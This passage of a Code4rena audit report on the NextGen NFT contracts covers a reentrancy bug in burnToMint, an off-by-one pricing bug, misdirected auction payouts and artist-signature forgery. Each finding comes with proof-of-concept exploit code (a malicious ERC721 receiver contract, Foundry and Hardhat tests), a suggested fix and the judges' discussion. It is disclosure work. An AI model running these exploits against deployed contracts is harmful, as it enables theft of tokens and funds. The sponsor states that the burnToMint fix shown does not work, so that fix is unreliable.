            0 // _setFinalSupplyTimeAfterMint
        );

        hhCore.setCollectionData(
            2, // _collectionID
            address(addr2), // _collectionArtistAddress
            2, // _maxCollectionPurchases
            10000, // _collectionTotalSupply
            0 // _setFinalSupplyTimeAfterMint
        );

        hhCore.addMinterContract(address(hhMinter));

        hhCore.addRandomizer(1, address(hhRandomizer));
        hhCore.addRandomizer(2, address(hhRandomizer));

        hhMinter.setCollectionCosts(
            1, // _collectionID
            0, // _collectionMintCost
            0, // _collectionEndMintCost
            0, // _rate
            5, // _timePeriod
            1, // _salesOptions
            0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B // delAddress
            // 0x0000000000000000000000000000000000000000
        );

        hhMinter.setCollectionCosts(
            2, // _collectionID
            0, // _collectionMintCost
            0, // _collectionEndMintCost
            0, // _rate
            5, // _timePeriod
            1, // _salesOptions
            0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B // delAddress
            // 0x0000000000000000000000000000000000000000
        );

        hhMinter.setCollectionPhases(
            1, // _collectionID
            1696931278, // _allowlistStartTime
            1696931280, // _allowlistEndTime
            1696931282, // _publicStartTime
            1796931284, // _publicEndTime
            bytes32(
                0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870
            ) // _merkleRoot
        );

        hhMinter.setCollectionPhases(
            2, // _collectionID
            1696931278, // _allowlistStartTime
            1696931280, // _allowlistEndTime
            1696931282, // _publicStartTime
            1796931284, // _publicEndTime
            bytes32(
                0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870
            ) // _merkleRoot
        );

        bytes32[] memory merkleRoot = new bytes32[](1);
        merkleRoot[
            0
        ] = 0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870;

        hhMinter.initializeBurn(1, 2, true);
        
        // Deploy a malicious contract to receive token 10000000000, later burn token 10000000000 to receive token 20000000000
        MaliciousContract maliciousContract = new MaliciousContract(address(hhCore), address(addr2), address(addr3));

        vm.warp(1796931283);

        // Mint token 10000000000 to malicious contract
        hhMinter.mint(
            1, // _collectionID
            1, // _numberOfTokens
            0, // _maxAllowance
            '{"tdh": "100"}', // _tokenData
            address(maliciousContract), // _mintTo
            merkleRoot, // _merkleRoot
            address(addr1), // _delegator
            2 //_varg0
        );

        // Malicious contract approve to addr2 so addr2 can call burnToMint on behalf of the malicious contract
        vm.prank(addr2);
        maliciousContract.approveToken();

        vm.prank(addr2);
        hhMinter.burnToMint(1, 10000000000, 2, 100);

        assertEq(hhCore.ownerOf(20000000000), address(maliciousContract)); // Malicious contract receives token 20000000000 after burnToMint.
        assertEq(hhCore.balanceOf(address(addr3)), 0); // NFT of addr3 is burnt
    }
}

contract MaliciousContract is IERC721Receiver {
    address public collection;
    address public admin;
    address public receiver;
    uint256 tokenIdToBurn = 10000000000;
    uint256 tokenIdToReceive = 20000000000;
    
    constructor(address _collection, address _admin, address _receiver) {
        collection = _collection;
        admin = _admin;
        receiver = _receiver;
    }

    function approveToken() external {
        require(msg.sender == admin);
        NextGenCore(collection).setApprovalForAll(admin, true);
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external override returns (bytes4) {
        if (_tokenId == tokenIdToBurn) {
            return IERC721Receiver.onERC721Received.selector;
        } else if (_tokenId == tokenIdToReceive) {
            // after receive the token, accept the sale offer immediately to send the token to buyer. To simplify, call transfer to the buyer
            NextGenCore(collection).transferFrom(address(this), receiver, tokenIdToBurn);
            return IERC721Receiver.onERC721Received.selector;
        }
        
    }
}
```

</details>

### Recommended Mitigation Steps

The order of operations in the `burnToMint` function should be revised to ensure that the token is burned before a new one is minted:

```diff
    function burnToMint(uint256 mintIndex, uint256 _burnCollectionID, uint256 _tokenId, uint256 _mintCollectionID, uint256 _saltfun_o, address burner) external {
        require(msg.sender == minterContract, "Caller is not the Minter Contract");
        require(_isApprovedOrOwner(burner, _tokenId), "ERC721: caller is not token owner or approved");
        collectionAdditionalData[_mintCollectionID].collectionCirculationSupply = collectionAdditionalData[_mintCollectionID].collectionCirculationSupply + 1;
        if (collectionAdditionalData[_mintCollectionID].collectionTotalSupply >= collectionAdditionalData[_mintCollectionID].collectionCirculationSupply) {
-           _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);
            // burn token
            _burn(_tokenId);
            burnAmount[_burnCollectionID] = burnAmount[_burnCollectionID] + 1;
+           _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);
        }
    }
```

### Assessed type

Reentrancy

**[a2rocket (NextGen) confirmed and commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597#issuecomment-1823857801):**
 > The proposed mitigation is not fully corrected, as you need to store the current owner of the token before burning it and use that into `safeMint`. If you do it like it's proposed, the `safeMint` will not be able to send the token. 

**[0xsomeone (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597#issuecomment-1840693754):**
 > The Warden has showcased that due to the absence of the Checks-Effects-Interactions pattern, it is possible to utilize an NFT to-be-burned (i.e. to sell it) before the actual burning operation is executed.
> 
> While the recommended alleviation does not work as expected per the Sponsor's comments, the submission is valid as it can cause the recipient of an NFT (if an open sale exists) to lose their value and not acquire any NFT.
> 
> I will downgrade this to a medium severity vulnerability per the judging guidelines, as the only loss-of-value is a hypothetical value **of an external protocol (i.e. trading one) rather than the NextGen system**. 

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597#issuecomment-1845147371):**
 > The Warden's submission was selected as the best due to a correct title, cleaner & concise representation throughout, and illustrative recommended mitigation.

***

## [[M-04] On a Linear or Exponential Descending Sale Model, a user that mints on the last `block.timestamp` mints at an unexpected price.](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1275)
*Submitted by [Fulum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1275), also found by [DeFiHackLabs](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1622), [bird-flu](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1385), [t0x1c](https://github.com/code-423n4/2023-10-nextgen-findings/issues/837), [Krace](https://github.com/code-423n4/2023-10-nextgen-findings/issues/700), [xAriextz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/499), [merlin](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1963), [phoenixV110](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1673), [00xSEV](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1439), [nuthan2x](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1407), [zhaojie](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1391), [xuwinnie](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1001), [PENGUN](https://github.com/code-423n4/2023-10-nextgen-findings/issues/990), [Jorgect](https://github.com/code-423n4/2023-10-nextgen-findings/issues/930), [oakcobalt](https://github.com/code-423n4/2023-10-nextgen-findings/issues/895), [VAD37](https://github.com/code-423n4/2023-10-nextgen-findings/issues/849), [twcctop](https://github.com/code-423n4/2023-10-nextgen-findings/issues/822), [Juntao](https://github.com/code-423n4/2023-10-nextgen-findings/issues/438), [DanielArmstrong](https://github.com/code-423n4/2023-10-nextgen-findings/issues/395), and [evmboi32](https://github.com/code-423n4/2023-10-nextgen-findings/issues/160)*

A user can mint a token at an incorrect price and lose funds if they mint on the last authorized `block.timestamp` during a Linear or Exponential Descending Sale Model.

### Proof of Concept

On a Linear or Exponential Descending Sale Model, the admin sets the `collectionMintCost` and the `collectionEndMintCost`. In context of these sale models, the `collectionMintCost` is the price for minting a token at the beginning and the `collectionEndMintCost` the price at the end of the sale.

The minting methods use the function `MinterContract::getPrice()` to compute the correct price at the actual timing, check the function with the branch for a Linear or Exponential Descending Sale Model:

```solidity
    function getPrice(uint256 _collectionId) public view returns (uint256) {
        uint tDiff;
        //@audit If Periodic Sale
        if (collectionPhases[_collectionId].salesOption == 3) {
            ...
        } else if (collectionPhases[_collectionId].salesOption == 2 && block.timestamp > collectionPhases[_collectionId].allowlistStartTime && block.timestamp < collectionPhases[_collectionId].publicEndTime){

            tDiff = (block.timestamp - collectionPhases[_collectionId].allowlistStartTime) / collectionPhases[_collectionId].timePeriod;
            uint256 price;
            uint256 decreaserate;
            //@audit If Exponential Descending Sale
            if (collectionPhases[_collectionId].rate == 0) {
                price = collectionPhases[_collectionId].collectionMintCost / (tDiff + 1);
                decreaserate = ((price - (collectionPhases[_collectionId].collectionMintCost / (tDiff + 2))) / collectionPhases[_collectionId].timePeriod) * ((block.timestamp - (tDiff * collectionPhases[_collectionId].timePeriod) - collectionPhases[_collectionId].allowlistStartTime));
            //@audit If Linear Descending Sale
            } else {
                if (((collectionPhases[_collectionId].collectionMintCost - collectionPhases[_collectionId].collectionEndMintCost) / (collectionPhases[_collectionId].rate)) > tDiff) {
                    price = collectionPhases[_collectionId].collectionMintCost - (tDiff * collectionPhases[_collectionId].rate);
                } else {
                    price = collectionPhases[_collectionId].collectionEndMintCost;
                }
            }
            if (price - decreaserate > collectionPhases[_collectionId].collectionEndMintCost) {
                return price - decreaserate; 
            } else {
                return collectionPhases[_collectionId].collectionEndMintCost;
            }
        } else {
            // fixed price
            return collectionPhases[_collectionId].collectionMintCost;
        }
    }
```

We can see that if the `collectionPhases[_collectionId].salesOption == 2` (it's the number for a descending sale model), and if the `block.timestamp` is `> allowlistStartTime` and `< publicEndTime`. The price is correctly computed.
A little check on the `mint()` function:

```solidity
    function mint(uint256 _collectionID, uint256 _numberOfTokens, uint256 _maxAllowance, string memory _tokenData, address _mintTo, bytes32[] calldata merkleProof, address _delegator, uint256 _saltfun_o) public payable {
        ...
        } else if (block.timestamp >= collectionPhases[col].publicStartTime && block.timestamp <= collectionPhases[col].publicEndTime) {
              ...
        } else {
            // fixed price
            return collectionPhases[_collectionId].collectionMintCost;
        }
    }
```

But if the `publicEndTime` is strictly equal to `publicEndTime`, the returned price is the `collectionMintCost` instead of `collectionEndMintCost` because the logic go to the "else" branch. It's an incorrect price because it's the price at the beginning of the collection. As you can see on `mint()`, a user can mint a token on the `block.timestamp` `publicEndTime`.

Users that mint on the last `block.timstamp` mint at an unexpected price and for all the minting methods which use the `getPrice()` function.

### Logs

You can see the logs of the test with this image:

*Note: to view the image, please see the original submission [here](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1275).*

Here's the [gist](https://gist.github.com/AxelAramburu/c10597b5ff60616b8a15d091f88de8da) if you want to execute the PoC directly.
You can execute the test with this command:

    forge test --mt testgetWrongPriceAtEnd -vvv (or with -vvvvv to see all the transaction logs)

### Recommended Mitigation Steps

Change the `< & >` to `<= & =>` on the `else/if` branch inside the `getPrice()` function.

```solidity
    function getPrice(uint256 _collectionId) public view returns (uint256) {
        uint tDiff;
        //@audit-info If Periodic Sale
        if (collectionPhases[_collectionId].salesOption == 3) {
            ...
        -- } else if (collectionPhases[_collectionId].salesOption == 2 && block.timestamp > collectionPhases[_collectionId].allowlistStartTime && -- block.timestamp < collectionPhases[_collectionId].publicEndTime){
        ++ } else if (collectionPhases[_collectionId].salesOption == 2 && block.timestamp => collectionPhases[_collectionId].allowlistStartTime && ++ block.timestamp <= collectionPhases[_collectionId].publicEndTime){

            tDiff = (block.timestamp - collectionPhases[_collectionId].allowlistStartTime) / collectionPhases[_collectionId].timePeriod;
            uint256 price;
            uint256 decreaserate;
            //@audit If Exponential Descending Sale
            if (collectionPhases[_collectionId].rate == 0) {
                price = collectionPhases[_collectionId].collectionMintCost / (tDiff + 1);
                decreaserate = ((price - (collectionPhases[_collectionId].collectionMintCost / (tDiff + 2))) / collectionPhases[_collectionId].timePeriod) * ((block.timestamp - (tDiff * collectionPhases[_collectionId].timePeriod) - collectionPhases[_collectionId].allowlistStartTime));
            //@audit If Linear Descending Sale
            } else {
                if (((collectionPhases[_collectionId].collectionMintCost - collectionPhases[_collectionId].collectionEndMintCost) / (collectionPhases[_collectionId].rate)) > tDiff) {
                    price = collectionPhases[_collectionId].collectionMintCost - (tDiff * collectionPhases[_collectionId].rate);
                } else {
                    price = collectionPhases[_collectionId].collectionEndMintCost;
                }
            }
            if (price - decreaserate > collectionPhases[_collectionId].collectionEndMintCost) {
                return price - decreaserate; 
            } else {
                return collectionPhases[_collectionId].collectionEndMintCost;
            }
        } else {
            // fixed price
            return collectionPhases[_collectionId].collectionMintCost;
        }
    }
```

### Assessed type

Invalid Validation

**[a2rocket (NextGen) confirmed via duplicate issue #1391](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1391#issuecomment-1824565193)**

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1275#issuecomment-1841640782):**
 > The Warden specifies an inconsistency within the code whereby the price calculation function will misbehave when measured for a sale type of `2` combined with the `block.timestamp` being the `publicEndTime` of the collection's sale period.
> 
> The finding is correct given that the relevant mint functions in the `MinterContract` perform an inclusive evaluation for both the `allowlistStartTime` and the `publicEndTime`, permitting this vulnerability to manifest when the `block.timestamp` is exactly equal to the `publicEndTime`.
> 
> The Sponsor has confirmed this in [#1391](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1391) and I accept the medium severity classification based on the submission's likelihood being low (due to the strict `block.timestamp` requirement), but the impact being high as an NFT would either be bought at a discount an arbitrary number of times, hurting the artist, or at a high markup, hurting the buyer.
> 
> The Warden's submission was selected as the best due to the presence of a PoC with logs that properly emphasize how the issue can be exacerbated depending on the configuration of a sale and its recommended mitigation being sufficient in rectifying the vulnerability.

***

## [[M-05] Auction payout goes to `AuctionDemo` contract owner, not the token owner](https://github.com/code-423n4/2023-10-nextgen-findings/issues/971)
*Submitted by [bird-flu](https://github.com/code-423n4/2023-10-nextgen-findings/issues/971), also found by [SovaSlava](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1986), [devival](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1893), [0xAadi](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1884), [smiling\_heretic](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1557), [Kaysoft](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1218), [Audinarey](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1127), [Viktor\_Cortess](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1098), [Eigenvectors](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1019), [DeFiHackLabs](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1010), [rotcivegaf](https://github.com/code-423n4/2023-10-nextgen-findings/issues/864), [cartlex\_](https://github.com/code-423n4/2023-10-nextgen-findings/issues/828), [00decree](https://github.com/code-423n4/2023-10-nextgen-findings/issues/795), [The\_Kakers](https://github.com/code-423n4/2023-10-nextgen-findings/issues/738), [Krace](https://github.com/code-423n4/2023-10-nextgen-findings/issues/633), [jacopod](https://github.com/code-423n4/2023-10-nextgen-findings/issues/517), [xAriextz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/493), [Hama](https://github.com/code-423n4/2023-10-nextgen-findings/issues/432), [funkornaut](https://github.com/code-423n4/2023-10-nextgen-findings/issues/422), [degensec](https://github.com/code-423n4/2023-10-nextgen-findings/issues/321), [Fitro](https://github.com/code-423n4/2023-10-nextgen-findings/issues/320), [AS](https://github.com/code-423n4/2023-10-nextgen-findings/issues/245), [peanuts](https://github.com/code-423n4/2023-10-nextgen-findings/issues/213), [evmboi32](https://github.com/code-423n4/2023-10-nextgen-findings/issues/152), [xiao](https://github.com/code-423n4/2023-10-nextgen-findings/issues/857), [REKCAH](https://github.com/code-423n4/2023-10-nextgen-findings/issues/313), and [openwide](https://github.com/code-423n4/2023-10-nextgen-findings/issues/290)*

At the end of an auction in `AuctionDemo`, the highest bidder claims the token, which transfers the token from the token owner to the auction winner. In the same transaction, the token owner should receive the auction payout.

However, the function `AuctionDemo::claimAuction()` sends the payout to the `AuctionDemo` contract owner.

This behavior deviates from the listed [invariant](https://github.com/code-423n4/2023-10-nextgen/tree/main?tab=readme-ov-file#main-invariants):


> The highest bidder will receive the token after an auction finishes, the owner of the token will receive the funds and all other participants will get refunded.

1. Auction is started, Alice deployed the `AuctionDemo` contract and Cecilia approved the `AuctionDemo` contract to transfer her tokens to the winning bidder.
2. Auction is completed. The highest bid was Bob.
3. Bob claims his winnings. The token is transferred from Cecilia to Bob. The bid from Bob is sent to Alice and Cecilia gets nothing.

### Impact

Any auction executed through `AuctionDemo` will have proceeds sent to the `AuctionDemo` contract owner, not the token owner. The token owner is left without auction proceeds.

### PoC

```javascript
context("Auction Sends proceeds to owner of auctiondemo, not the token owner", () => {
    it.only("should execute", async () => {
    const tokenOwner = signers.addr2;
    const nextGenOwner = signers.owner;
    const highestBidder = signers.addr3;

    // Auction contract and collections Setup
    const AuctionDemo = await ethers.getContractFactory("auctionDemo");
    let auctionDemo = await AuctionDemo.deploy(
        await contracts.hhMinter.getAddress(),
        await contracts.hhCore.getAddress(),
        await contracts.hhAdmin.getAddress()
    );
    timestamp = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp;

    await contracts.hhCore.addMinterContract(contracts.hhMinter.getAddress());
    await contracts.hhCore.createCollection(
        "Test Collection 1",
        "Artist 1",
        "For testing",
        "www.test.com",
        "CCO",
        "https://ipfs.io/ipfs/hash/",
        "",
        ["desc"],
    );
    await contracts.hhCore.addRandomizer(1, contracts.hhRandomizer.getAddress());
    await contracts.hhCore.connect(signers.owner).setCollectionData(1, signers.addr1.getAddress(), 100, 200, timestamp + 250);

    await contracts.hhMinter.setCollectionCosts(1, ethers.parseEther('.1'), ethers.parseEther('.1'), 0, 100, 0, signers.addr1.getAddress())
    await contracts.hhMinter.setCollectionPhases(1, timestamp + 25, timestamp + 50, timestamp + 100, timestamp + 150, '0x0000000000000000000000000000000000000000000000000000000000000000')

    await ethers.provider.send("evm_increaseTime", [20]);
    await contracts.hhMinter.connect(nextGenOwner).mintAndAuction(tokenOwner.getAddress(), "Test Auction 1", 10, 1, timestamp + 100);

    id1 = 10000000000;
    await contracts.hhCore.connect(tokenOwner).approve(auctionDemo.getAddress(), id1);

    // Winning auction bid
    await auctionDemo.connect(highestBidder).participateToAuction(id1, { value: ethers.parseEther('2') });

    // Move past auction end time and claim token
    await ethers.provider.send("evm_setNextBlockTimestamp", [timestamp + 101]);
    const transaction = auctionDemo.connect(highestBidder).claimAuction(id1);

    // get owner of auditDemo contract and make sure it's not the token owner for this usecase
    let owner = await auctionDemo.connect(nextGenOwner).owner();
    expect(owner).to.not.equal(tokenOwner.getAddress());

    // NextGen owner receives proceeds, token owner receives nothing.
    await expect(() => transaction).to.changeEtherBalance(nextGenOwner, ethers.parseEther('2'));
    await expect(() => transaction).to.changeEtherBalance(tokenOwner, 0);
    expect(await contracts.hhCore.ownerOf(id1)).to.eq(await highestBidder.getAddress());
    });
});
```

### Recommendations

Send the auction proceeds to `ownerOfToken` instead of [owner](https://github.com/code-423n4/2023-10-nextgen/blob/main/hardhat/smart-contracts/AuctionDemo.sol#L113).

[AuctionDemo L113-L114](https://github.com/code-423n4/2023-10-nextgen/blob/main/hardhat/smart-contracts/AuctionDemo.sol#L113-L114)

```diff
@@ -110,8 +110,8 @@ contract auctionDemo is Ownable {
for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
    if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && 112| auctionInfoData[_tokenid][i].status == true) {
        IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
-       (bool success, ) = payable(owner()).call{value: highestBid}("");
-       emit ClaimAuction(owner(), _tokenid, success, highestBid);
+       (bool success, ) = payable(ownerOfToken).call{value: highestBid}("");
+       emit ClaimAuction(ownerOfToken, _tokenid, success, highestBid);
```

### Assessed type

ETH-Transfer

**[a2rocket (NextGen) confirmed and commented via duplicate issue #245](https://github.com/code-423n4/2023-10-nextgen-findings/issues/245#issuecomment-1822700002):**
> The `mintAndAuction` function can only be called by trusted parties. The `_recipient` of that function will be a trusted wallet that will also call `setApprovalForAll()` from the Core contract for the Auction Contract. In our case, the `_recipient` will be the deployer of the Auction contract; at the end of the day, the token owner and auction owner are the same person.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/971#issuecomment-1847923059):**
 > After re-visiting, I consider this submission to be better than [#738](https://github.com/code-423n4/2023-10-nextgen-findings/issues/738) because it also correctly specifies that the `event` should be fixed rather than just the statement. While I cannot penalize submissions for not including the `event` in their proposed remediations, I can mark a submission that cites it and is of equivalent quality as "best".

**[MrPotatoMagic (warden) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/971#issuecomment-1848601608):**
 > @0xsomeone, here is why I believe this issue is QA at most:
> 
> 1. As per the sponsors comments [here](https://github.com/code-423n4/2023-10-nextgen-findings/issues/245#issuecomment-1822700002), the owner of the auction contract and the owner of the token are trusted team's address. This means that whether the funds are sent to either, they are not lost, just that the team needs to make an additional fund transfer on their end (if needed).
> 2. Although the invariant is broken, it has no impact on the functioning of the protocol.
> Due to this, I believe the severity should be QA at most.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/971#issuecomment-1848645800):**
 > @MrPotatoMagic, thanks for contributing! The code goes against its specification and breaks an invariant of the protocol. Regardless of severity, an invariant being broken will always be considered a medium-risk issue given that it relates to pivotal functionality in the system being incorrect.
> 
> In this case, funds are sent to a NextGen address rather than a collection-affiliated address or secondary smart contract meant to facilitate fund disbursements. This has implications tax-wise, implications about trust (i.e. if a 10m auction is held, the stakes of trust are increased significantly), and other such problems. Logistically, it is also a heavy burden to manage multiple auction payments at once, prove which source sent which, and so on.
> 
> Combining the above with the fact that **a clear invariant of the protocol is broken**, I will maintain the medium-risk rating.

***

## [[M-06] Artist signatures can be forged to impersonate the artist behind a collection](https://github.com/code-423n4/2023-10-nextgen-findings/issues/741)
*Submitted by [The\_Kakers](https://github.com/code-423n4/2023-10-nextgen-findings/issues/741), also found by [mrudenko](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1752), [alexfilippov314](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1055), [xuwinnie](https://github.com/code-423n4/2023-10-nextgen-findings/issues/986), [xAriextz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/408), [Draiakoo](https://github.com/code-423n4/2023-10-nextgen-findings/issues/159), [Stryder](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1972), [0xblackskull](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1676), [VAD37](https://github.com/code-423n4/2023-10-nextgen-findings/issues/855), [rotcivegaf](https://github.com/code-423n4/2023-10-nextgen-findings/issues/771), [BugzyVonBuggernaut](https://github.com/code-423n4/2023-10-nextgen-findings/issues/562), and [zach](https://github.com/code-423n4/2023-10-nextgen-findings/issues/478)*

Artist signatures can be forged, making it possible to sign any message, while "proving" that it was signed by any address.

This can be done to impersonate any address from any artist, breaking a core protocol functionality, and losing users' trust. The signature can't be deleted by anyone, nor the artist address, once the collection is signed.

This also breaks one of the [main invariants of the protocol](https://github.com/code-423n4/2023-10-nextgen/tree/main#main-invariants):

> Properties that should NEVER be broken under any circumstance:
>
> - Only artists can sign their collections.

Evaluated as Medium since it breaks a core contract functionality, and a main invariant, regardless of trusted roles. As any collection admin can impersonate any legit address, which should be consider a way to "escalate their authority beyond their role" [as mentioned on the Access Control and Permissions Attack Ideas](https://github.com/code-423n4/2023-10-nextgen/tree/main#attack-ideas-where-to-look-for-bugs).

### Proof of Concept

`setCollectionData()` allows to set the artist address when the current `collectionTotalSupply == 0`:

- [NextGenCore.sol#L149](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L149)
- [NextGenCore.sol#L150](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L150)

The problem is that it doesn't check that the param `collectionTotalSupply` passed is `!= 0`. Meaning that the function can be executed multiple times to change the artist address, as long as the total supply is zero:

- [NextGenCore.sol#L148](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L148)
- [NextGenCore.sol#L153](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L153)

So, it can be called first to set a fake artist address to call `artistSignature()` to sign the collection:

- [NextGenCore.sol#L257](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L257)

And then call `setCollectionData()` again to set the legit artist address.

Once the signature is set, it can't be changed, nor the artist address, as it will always fall under the `else` clause:

- [NextGenCore.sol#L162](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L162)
- [NextGenCore.sol#L258](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L258)

The following coded POC shows how it can be done.

### Coded Proof of Concept

1. Run `forge init --no-git --force` to initiate Foundry on the root of the project.
2. Create `test/Poc.t.sol` and copy the snippet below.
3. Run `forge test`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {NextGenAdmins} from "smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "smart-contracts/NextGenCore.sol";


contract AuctionTest is Test {
    NextGenAdmins admin;
    NextGenCore gencore;
    address collectionAdmin;

    function setUp() public {
        admin = new NextGenAdmins();
        gencore = new NextGenCore("core", "core", address(admin));

        string[] memory collectionScript = new string[](0);

        gencore.createCollection(
            "Name", "Artist", "Description", "Website", "License", "https://base-uri.com/" "Library", "Script", new string[](0)
        );

        uint256 collectionId = 1;
        collectionAdmin = makeAddr("collectionAdmin");
        admin.registerCollectionAdmin(collectionId, collectionAdmin, true);
    }

    function testArtistSignature() public {
        uint256 collectionId = 1;
        address fakeArtist = collectionAdmin;
        uint256 maxCollectionPurchases = 10;
        uint256 zeroSupply = 0; // Supply = 0 allows this attack
        uint256 setFinalSupplyTimeAfterMint = block.timestamp + 30 days;

        // The collection admin sets the initial collection data with a fake artist
        vm.prank(collectionAdmin);
        gencore.setCollectionData(
            collectionId,
            fakeArtist,
            maxCollectionPurchases,
            zeroSupply,
            setFinalSupplyTimeAfterMint
        );

        // Then uses the fake artist address to sign a message impersonating a legit artist
        string memory fakeSignature = "I am the Legit Artist Behind CryptoPunks. This is my signature.";
        vm.prank(fakeArtist);
        gencore.artistSignature(collectionId, fakeSignature);

        address legitArtist = makeAddr("legitArtist");
        uint256 realTotalSupply = 1000;

        // Finally sets the "initial" collection data again, but with the legit artist address and the real total supply
        vm.prank(collectionAdmin);
        gencore.setCollectionData(
            collectionId,
            legitArtist,
            maxCollectionPurchases,
            realTotalSupply,
            setFinalSupplyTimeAfterMint
        );

        // The result is a collection impersonating a legit address, with a fake signature as a proof
        assertEq(gencore.retrieveArtistAddress(collectionId), legitArtist);
        assertEq(gencore.artistsSignatures(collectionId), fakeSignature);
    }
}
```

### Recommended Mitigation Steps

One way to prevent this is by checking that the collection total supply is set to a value `> 0`:

```diff
    function setCollectionData(
        uint256 _collectionID,
        address _collectionArtistAddress,
        uint256 _maxCollectionPurchases,
        uint256 _collectionTotalSupply,
        uint _setFinalSupplyTimeAfterMint
    ) public CollectionAdminRequired(_collectionID, this.setCollectionData.selector) {
        require(
            (isCollectionCreated[_collectionID] == true) && 
            (collectionFreeze[_collectionID] == false) && 
+           (_collectionTotalSupply > 0)
            (_collectionTotalSupply <= 10000000000
        ), "err/freezed");
```

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/741#issuecomment-1843091896):**
 > The Warden specifies a potential attack path in the artist configuration of a collection by weaponizing the absence of an input sanitization for the `_collectionTotalSupply` argument.
> 
> Specifically, they envision the following scenario:
> - A collection is initialized with an artist **but a zero `_collectionTotalSupply` value**.
> - An artist signs the collection (this is permitted by `artistSignature`).
> - A collection is re-initialized as the `if` structure enters the first conditional, this time with a non-zero collection supply and a different artist.
> 
> At this point, the collection will have a different artist than the one that signed the collection which breaks an invariant of the protocol and is incorrect behavior.
> 
> The Sponsor disputes this submission, but I invite them to re-consider the above step-by-step scenario which is presently possible in the codebase.
> 
> I believe that a medium-risk rating for this is correct, as the artist associated with a collection is crucial to the collection's value, and a collection will appear "signed" even if the artist did not sign it.
> 
> The Warden's submission was selected as the best due to pinpointing the exact problem in the codebase, outlining a step-by-step scenario via which it can be exploited, and assigning it an apt risk rating.

**[a2rocket (NextGen) disputed and commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/741#issuecomment-1844559910):**
 > NextGen admins are responsible for setting up a collection. The steps are [here](https://seize-io.gitbook.io/nextgen/nextgen-smart-contracts/getting-started).
> 
> No one can sign a collection besides the address that was set during step 2, so the statement that anyone can impersonate artist is totally wrong!
> 
> The collection is deemed finalized when a `totalSupply` is set! Once a `totalsupply` is set and the artist did not sign, the address of the artist can change. Once the artist signs the collection the signature cannot change. This is the process. 

**[MrPotatoMagic (warden) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/741#issuecomment-1848593029):**
 > @0xsomeone, this issue should be marked QA at most or even invalid imo. Here is why:
> 
> 1. In the follow-up feedback from the sponsor above, @a2rocket clearly mentions NextGen admins are responsible for setting up a collection. This means not anyone can just create a collection and launch this attack since it requires the NextGen team's trust in a set of people.
> 2. Even after the filtering process by the NextGen team, the signature can never be forged because on the blockchain you can clearly see who signed the transaction i.e. the call to [artistSignature()](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L258), which can only be made by the current address set for the collection.
